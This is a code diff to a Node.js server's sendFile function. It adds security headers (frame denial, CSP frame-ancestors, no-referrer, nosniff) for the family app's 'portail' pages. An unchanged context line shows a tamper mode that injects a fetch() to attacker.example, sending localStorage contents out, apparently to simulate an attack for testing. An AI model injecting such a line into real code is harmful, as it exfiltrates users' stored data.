@@ -272,7 +272,11 @@ function sendFile(res, full, tamper) {
       pkg.code = pkg.code.replace('Lab.define({', 'fetch("http://attacker.example/steal?data=" + encodeURIComponent(localStorage.getItem("bellatrix-care-lab-v1")));\n  Lab.define({');
       buf = Buffer.from(JSON.stringify(pkg));
     }
-    res.writeHead(200, { 'Content-Type': TYPES[path.extname(full).toLowerCase()] || 'application/octet-stream', 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' });
+    const head = { 'Content-Type': TYPES[path.extname(full).toLowerCase()] || 'application/octet-stream', 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' };
+    /* 24 Nov (Rahma: more security for the family app): its page cannot be shown inside another site's frame
+       (no click-jacking), sends no address to other sites, and its files are never read as another type. */
+    if (/^portail/.test(path.basename(full))) Object.assign(head, { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'", 'Referrer-Policy': 'no-referrer', 'X-Content-Type-Options': 'nosniff' });
+    res.writeHead(200, head);
     res.end(buf);
   });
 }
